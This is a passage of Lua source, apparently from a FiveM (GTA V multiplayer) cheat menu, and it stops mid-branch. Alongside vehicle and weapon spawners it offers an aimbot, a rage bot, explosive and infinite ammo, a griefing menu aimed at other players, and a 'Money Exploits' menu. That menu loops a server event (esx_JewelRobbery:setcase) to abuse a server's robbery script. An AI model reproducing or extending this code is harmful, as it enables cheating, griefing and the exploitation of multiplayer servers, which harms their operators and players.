			if takytemamrad.MenuButton('<font color="#66666A">Service/Emergency/Military', 'localservice') then end
			if takytemamrad.MenuButton('<font color="#66666A">Commercial/Trains', 'localcommercial') then end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localcompacts') then
			for i = 1, #VehicleClass.compacts do
				local modelName = VehicleClass.compacts[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('compacts')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localsedans') then
			for i = 1, #VehicleClass.sedans do
				local modelName = VehicleClass.sedans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('sedans')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localsuvs') then
			for i = 1, #VehicleClass.suvs do
				local modelName = VehicleClass.suvs[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('suvs')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localcoupes') then
			for i = 1, #VehicleClass.coupes do
				local modelName = VehicleClass.coupes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('coupes')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localmuscle') then
			for i = 1, #VehicleClass.muscle do
				local modelName = VehicleClass.muscle[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('muscle')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localsportsclassics') then
			for i = 1, #VehicleClass.sportsclassics do
				local modelName = VehicleClass.sportsclassics[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('sportsclassics')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localsports') then
			for i = 1, #VehicleClass.sports do
				local modelName = VehicleClass.sports[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('sports')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localsuper') then
			for i = 1, #VehicleClass.super do
				local modelName = VehicleClass.super[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('super')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localmotorcycles') then
			for i = 1, #VehicleClass.motorcycles do
				local modelName = VehicleClass.motorcycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('motorcycles')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localoffroad') then
			for i = 1, #VehicleClass.offroad do
				local modelName = VehicleClass.offroad[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('offroad')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localindustrial') then
			for i = 1, #VehicleClass.industrial do
				local modelName = VehicleClass.industrial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('industrial')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localutility') then
			for i = 1, #VehicleClass.utility do
				local modelName = VehicleClass.utility[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('utility')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localvans') then
			for i = 1, #VehicleClass.vans do
				local modelName = VehicleClass.vans[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('vans')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localcycles') then
			for i = 1, #VehicleClass.cycles do
				local modelName = VehicleClass.cycles[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('cycles')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localboats') then
			for i = 1, #VehicleClass.boats do
				local modelName = VehicleClass.boats[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('boats')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localhelicopters') then
			for i = 1, #VehicleClass.helicopters do
				local modelName = VehicleClass.helicopters[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('helicopters')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localplanes') then
			for i = 1, #VehicleClass.planes do
				local modelName = VehicleClass.planes[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('planes')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localservice') then
			for i = 1, #VehicleClass.service do
				local modelName = VehicleClass.service[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('service')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('localcommercial') then
			for i = 1, #VehicleClass.commercial do
				local modelName = VehicleClass.commercial[i][1]
				local vehname = GetLabelText(GetDisplayNameFromVehicleModel(modelName))

				if takytemamrad.Button(vehname) then
					SpawnLocalVehicle(modelName, Cya.Toggle.ReplaceVehicle, Cya.Toggle.SpawnInVehicle)
				end
			end

			takytemamrad.DrawVehiclePreview('commercial')
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LSC") then
			if Cya.Player.IsInVehicle then
				if takytemamrad.MenuButton('<font color="#66666A">Full Performance', '<font color="#4280C6">Native') then
					takytemamrad.FullPerfo()
				end
				if takytemamrad.MenuButton('<font color="#66666A">Full Tuning', '<font color="#4280C6">Native') then
					takytemamrad.FullTune()
				end
				if takytemamrad.MenuButton('<font color="#66666A">Bodywork', "lsc_bodywork") then
					LSC.UpdateMods()
				end
				if takytemamrad.MenuButton('<font color="#66666A">Performance Tuning', "lsc_performance") then
					LSC.UpdateMods()
				end
			else
				if takytemamrad.Button('<font color="#D82A2A">Please enter a vehicle') then
				end
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("lsc_bodywork") then
			local installed = currentMods
			if Cya.Player.IsInVehicle then
				for i, mod in pairs(LSC.vehicleMods) do
					SetVehicleModKit(Cya.Player.Vehicle, 0)
					local modCount = GetNumVehicleMods(Cya.Player.Vehicle, mod.id)
					if modCount > 0 then
						if mod.meta == "modFrontWheels" or mod.meta == "modBackWheels" then
							if takytemamrad.ComboBox(mod.name, LSC.WheelType, installed['wheels'], function(selectedIndex, selectedItem)
								selectedIndex = selectedIndex - 1
								installed['wheels'] = selectedIndex
								SetVehicleWheelType(Cya.Player.Vehicle, selectedIndex)
								takytemamrad.SetSubTitle(mod.meta, selectedItem .. " Wheels")
							end, true) then
								if modCount > 0 then
									setMenuVisible(mod.meta, true)
								end
							end
						else
							if takytemamrad.MenuButton(mod.name, mod.meta) then end
						end
					end

					if mod.meta == "modXenon" then
						if takytemamrad.CheckBox(mod.name, installed['modXenon']) then
							ToggleVehicleMod(Cya.Player.Vehicle, 22, not installed['modXenon'])
							LSC.UpdateMods()
						end

						if installed['modXenon'] then
							if takytemamrad.ComboBox("Xenon Color", ComboOptions.XenonColor.Words, ComboOptions.XenonColor.Selected, function(selectedIndex)	
								if ComboOptions.XenonColor.Selected ~= selectedIndex then
									ComboOptions.XenonColor.Selected = selectedIndex
								end
							end) then
								SetVehicleXenonLightsColour(Cya.Player.Vehicle, ComboOptions.XenonColor.Values[ComboOptions.XenonColor.Selected])
							end
							
						end
					end
				end
			else
				if takytemamrad.Button('<font color="#66666A">No vehicle found') then
				end
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("lsc_performance") then
			local installed = currentMods
			if Cya.Player.IsInVehicle then
				SetVehicleModKit(Cya.Player.Vehicle, 0)
				for i, type in pairs(LSC.perfMods) do
					local modCount = GetNumVehicleMods(Cya.Player.Vehicle, type.id)
					if modCount > 0 then
						if takytemamrad.Slider(type.name, VehicleUpgradeWords[modCount], installed[type.meta], function(selectedIndex)
							selectedIndex = selectedIndex - 2
							installed[type.meta] = selectedIndex
							SetVehicleMod(Cya.Player.Vehicle, type.id, selectedIndex, false)
						end, true) then end
					end
				end

				if takytemamrad.CheckBox("Turbo", installed['modTurbo'], function(enabled)
					installed['modTurbo'] = enabled
					ToggleVehicleMod(Cya.Player.Vehicle, 18, enabled)
				end) then end
				
				if takytemamrad.ComboBox('<font color="#66666A">Engine Power', ComboOptions.EnginePower.Words, ComboOptions.EnginePower.Selected, function(selectedIndex)
					if ComboOptions.EnginePower.Selected ~= selectedIndex then
						ComboOptions.EnginePower.Selected = selectedIndex
						ModifyVehicleTopSpeed(Cya.Player.Vehicle, ComboOptions.EnginePower.Values[ComboOptions.EnginePower.Selected])
					end
				end) then 
				end

				
			else
				if takytemamrad.Button('<font color="#66666A">No vehicle found') then
				end
			end


			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalWepMenu") then
			if takytemamrad.MenuButton('<font color="#66666A">Weapon Spawner', "LocalWepCategory") then end
			if takytemamrad.MenuButton('<font color="#66666A">Weapon Aimbot', "LocalWepAimbot") then end
			if takytemamrad.MenuButton('<font color="#66666A">Weapon Customizer', "LocalWepCustomer") then 
			   takytemamrad.SendNotification({text = "You must hold a weapon in your hand!", type = "info"}) end

			if Rage then
				if takytemamrad.CheckBox('<font color="#66666A">Rapid Fire', Cya.Toggle.RapidFire) then Cya.Toggle.RapidFire = not Cya.Toggle.RapidFire end

				if takytemamrad.CheckBox('<font color="#66666A">Silent Explosive Ammo', Cya.Toggle.SilentExplosiveAmmo) then Cya.Toggle.SilentExplosiveAmmo = not Cya.Toggle.SilentExplosiveAmmo end

				if takytemamrad.CheckBox('<font color="#66666A">Explosive Ammo', Cya.Toggle.ExplosiveAmmo) then Cya.Toggle.ExplosiveAmmo = not Cya.Toggle.ExplosiveAmmo end
			
			end
			SetWeaponDamageModifier(GetSelectedPedWeapon(PlayerPedId()), SliderOptions.DamageModifier.Values[SliderOptions.DamageModifier.Selected])
			if takytemamrad.Slider('~w~<font color="#66666A">Damage Modifier</font> <font color="#D82A2A">(!)</font>', SliderOptions.DamageModifier.Words, SliderOptions.DamageModifier.Selected, function(selectedIndex)
				if SliderOptions.DamageModifier.Selected ~= selectedIndex then
					SliderOptions.DamageModifier.Selected = selectedIndex
				end
			end) then end

			if Rage then
				if takytemamrad.Button('<font color="#66666A">Give All Weapons', '<font color="#4280C6">Native') then
					PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					for i = 1, #t_Weapons do
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 256, false, false)
					end
				end
			end
			
			if takytemamrad.Button('<font color="#66666A">Remove All Weapons', '<font color="#4280C6">Native') then
				for i = 1, #t_Weapons do
					RemoveWeaponFromPed(PlayerPedId(), t_Weapons[i][1])
				end
			end

			if takytemamrad.Button('<font color="#66666A">Set current weapon ammo', '<font color="#4280C6">Native') then
				local _, weaponHash = GetCurrentPedWeapon(PlayerPedId())
				local amount = KeyboardInput("Feed me with ammo daddy", "", 3)
				local ammo = floor(tonumber(amount) + 0.5)
				SetPedAmmo(PlayerPedId(), weaponHash, ammo)
			end

			if Rage then
				if takytemamrad.CheckBox('<font color="#66666A">Infinite Ammo', InfAmmo, function(enabled) InfAmmo = enabled SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo) end) then end	
			end
			if Rage then
				if takytemamrad.CheckBox('<font color="#66666A">Delete Gun', Cya.Toggle.DeleteGun) then Cya.Toggle.DeleteGun = not Cya.Toggle.DeleteGun end
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalWepAimbot") then
			if takytemamrad.CheckBox('~w~<font color="#66666A">Aimbot</font> <font color="#D82A2A">(!)</font>', weaponsAimbotT) then 
				weaponsAimbotT = not weaponsAimbotT 
			end
			if takytemamrad.CheckBox('~w~<font color="#66666A">Rage Bot</font> <font color="#D82A2A">(!)</font>', HVH) then 
				HVH = not HVH 
			end 
			if takytemamrad.CheckBox('<font color="#66666A">No Recoil', NoRecoil) then 
				NoRecoil = not NoRecoil 
			end 

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalWepCategory") then
			takytemamrad.MenuButton('<font color="#66666A">Melee', "LocalMeleeWeapons")
			takytemamrad.MenuButton('<font color="#66666A">Handguns', "LocalSidearmWeapons")
			takytemamrad.MenuButton('<font color="#66666A">Submachine Guns', "LocalSmgWeapons")
			takytemamrad.MenuButton('<font color="#66666A">Shotguns', "LocalShotgunWeapons")
			takytemamrad.MenuButton('<font color="#66666A">Assault Rifles', "LocalAssaultRifleWeapons")
			takytemamrad.MenuButton('<font color="#66666A">Light Machine Guns', "LocalMachineGunWeapons")
			takytemamrad.MenuButton('<font color="#66666A">Sniper Rifles', "LocalSniperRifles")
			takytemamrad.MenuButton('<font color="#66666A">Heavy Weapons', "LocalHeavyWeapons")

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalWepCustomer") then
			local ped = PlayerPedId()
			local currentWeaponHash = GetSelectedPedWeapon(ped)
			if takytemamrad.ComboBox('<font color="#66666A">Weapon Skin', {'<font color="#66666A">Default', '<font color="#4BEB72">Green', '<font color="#FFD100">Gold', '<font color="#D846FF">Pinky', '<font color="#97661E">Army', '<font color="#212FAD">Police', '<font color="#FF6C00">Orange', '<font color="#FFFCFB">Platinum'}, SelectSkin, function(selectedIndex)
				if SelectSkin ~= selectedIndex then
					SelectSkin = selectedIndex
				end

			end) then 
				if SelectSkin == 1 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 0.0)
				elseif SelectSkin == 2 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1)
				elseif SelectSkin == 3 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2)
				elseif SelectSkin == 4 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3)
				elseif SelectSkin == 5 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 4)
				elseif SelectSkin == 6 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 5)
				elseif SelectSkin == 7 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 6)
				elseif SelectSkin == 8 then
					SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 7)
				end
			end

			for k,v in pairs(WeaponAttachments) do
				for CryzysekSiPicusAniToPrejmenovatNedokazesPff, WeaponModify in pairs(v) do
					if GetHashKey(WeaponModify.id) == currentWeaponHash then
						for k,v in pairs(WeaponModify.mods) do
							for SmrladlavaPuncocha, WeaponAttachmentsBracho in pairs(v) do
								if takytemamrad.CheckBox(WeaponAttachmentsBracho.name, WeaponAttachmentsBracho.bInfAmmo, function(enabled) 
									WeaponAttachmentsBracho.bInfAmmo = enabled 
									if WeaponAttachmentsBracho.bInfAmmo == true then
										GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponModify.id), GetHashKey(WeaponAttachmentsBracho.id))
									elseif WeaponAttachmentsBracho.bInfAmmo == false then
										RemoveWeaponComponentFromPed(GetPlayerPed(-1), GetHashKey(WeaponModify.id), GetHashKey(WeaponAttachmentsBracho.id))
									end
								end) then end	
							end
						end
					end
				end
			end


			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalMeleeWeapons") then
			local selectedWeapon = {}
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if takytemamrad.Button(t_Weapons[i][2]) then
						PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], 0, false, false)
					end
					selectedWeapon[optionCount] = i
				end
			end

			-- takytemamrad.DrawWeaponPreview(selectedWeapon[menus[currentMenu].currentOption])
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if takytemamrad.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 100, false, false)
						end
					else
						if takytemamrad.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalAssaultRifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if takytemamrad.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if takytemamrad.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if takytemamrad.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if takytemamrad.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalMachineGunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "lmgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if takytemamrad.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if takytemamrad.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalSmgWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "smgs" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if takytemamrad.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if takytemamrad.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalSniperRifles") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "sniperrifles" then
					if t_Weapons[i][6] then
						if weaponMkSelection[i] == nil then weaponMkSelection[i] = 1 end
						
						if takytemamrad.ComboBox(t_Weapons[i][2], ComboOptions.MK2.Words, weaponMkSelection[i], function(selectedIndex)
							if weaponMkSelection[i] ~= selectedIndex then
								weaponMkSelection[i] = selectedIndex
							end
						end) then 
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), GetHashKey(t_Weapons[i][1] .. ComboOptions.MK2.Values[weaponMkSelection[i]]), 0, false, false)
						end
					else
						if takytemamrad.Button(t_Weapons[i][2]) then
							PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
							GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
						end
					end
				end
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("LocalHeavyWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "heavyweapons" then
					if takytemamrad.Button(t_Weapons[i][2]) then
						PlaySoundFrontend(-1, "PICK_UP", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
						GiveWeaponToPed(PlayerPedId(), t_Weapons[i][1], GetWeaponClipSize(t_Weapons[i][1]) * 5, false, false)
					end
				end
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("GriefMenu") then
			if takytemamrad.CheckBox('<font color="#12D505">Include Self', allPlayersIncludeSelf) then allPlayersIncludeSelf = not allPlayersIncludeSelf  end
			if takytemamrad.MenuButton('<font color="#66666A">Explosion Menu', "MenuExplosion") then end
			if takytemamrad.MenuButton('<font color="#66666A">Fun Menu', "MenuFun") then end
			if takytemamrad.MenuButton('<font color="#66666A">SQL Menu', "MenuHack") then end
			if takytemamrad.MenuButton('<font color="#66666A">Prop Menu', "MenuAttach") then end
			

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("ServerMenu") then
			if takytemamrad.Button('<font color="#66666A">Get Resources State') then
				local numres = GetNumResources()
				local nstopres = 0
				for i=1,numres do
				local r = GetResourceByFindIndex(i)
				if r ~= nil and fm.resstopped(r) then
					nstopres = nstopres + 1
				end
				end
				debugprint('Total Resources: ' .. numres)
				debugprint('Total Stopped Resources: ' .. nstopres)
			end
			if takytemamrad.Button('<font color="#D82A2A">Kill Menu') then
				--takytemamrad.MenuClosingPrint() 
				isMenuEnabled = false 
			end
			if takytemamrad.MenuButton('<font color="#66666A">Money Exploits',"MenuMoney") then end
			if takytemamrad.MenuButton('<font color="#66666A">Triggers Options',"MenuTrigger") then end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened('MenuSettings') then
			--if takytemamrad.MenuButton("Change Color Theme", "MenuSettingsColor") then end
			if takytemamrad.CheckBox('<font color="#66666A">Rage Mode~c~', Rage, function(enabled) Rage = enabled end) then end
			if takytemamrad.CheckBox('<font color="#66666A">CK Gang Logo~c~', Klidny, function(enabled) Klidny = enabled end) then end
			if takytemamrad.MenuButton('<font color="#66666A">Credits', "MenuSettingsCredits") then end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuSettingsColor") then
			if takytemamrad.Button("~p~DARK", nil, themeColors.dark) then
				_menuColor.base = themeColors.dark
			end
			if takytemamrad.Button("~r~Red", nil, themeColors.red) then
				_menuColor.base = themeColors.red
			end

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuSettingsCredits") then
			for _, v in pairs(contributors) do 
				if takytemamrad.Button(v[1], v[2]) then end 
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("StopperResources") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("ServerResources") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("ESXBoss") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuMoney") then
			local Self = GetPlayerServerId(PlayerId())
			if GetResourceState("esx_jewelrobbery") == "started" then
				if takytemamrad.Button("~y~Vangelico ~s~", "~o~Enjoy") then
					for i = 0, 20 do 
						BLOWMYDICK("esx_JewelRobbery:setcase", i, true)
					end
				end
			end
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MenuTrigger") then

			

			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("ESXMisc") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("MiscServerOptions") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlinePlayersMenu") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("PlayerOptionsMenu") then
			takytemamrad.Display()
		elseif takytemamrad.IsMenuOpened("OnlineTeleportMenu") then
			if takytemamrad.Button('<font color="#66666A">Teleport To Player', '<font color="#4280C6">Native') then
                Cya.Hra:TeleportToPlayer(SelectedPlayer)
            end

            if takytemamrad.Button('<font color="#66666A">Teleport into Vehicle', '<font color="#4280C6">Native') then
